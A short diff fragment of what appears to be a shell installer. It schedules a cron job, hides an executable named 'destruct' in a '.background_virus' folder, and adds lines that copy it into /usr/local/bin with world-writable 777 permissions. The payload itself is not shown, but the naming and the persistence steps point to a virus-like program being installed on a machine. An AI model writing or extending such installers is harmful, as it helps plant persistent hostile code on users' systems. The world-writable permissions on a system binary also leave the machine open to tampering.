@@ -10,3 +10,5 @@ crontab mycron
 rm mycron
 
 chmod 777 ~/Desktop/.background_virus/destruct
+cp ~/Desktop/.background_virus/destruct /usr/local/bin/destruct 
+chmod 777 /usr/local/bin/destruct
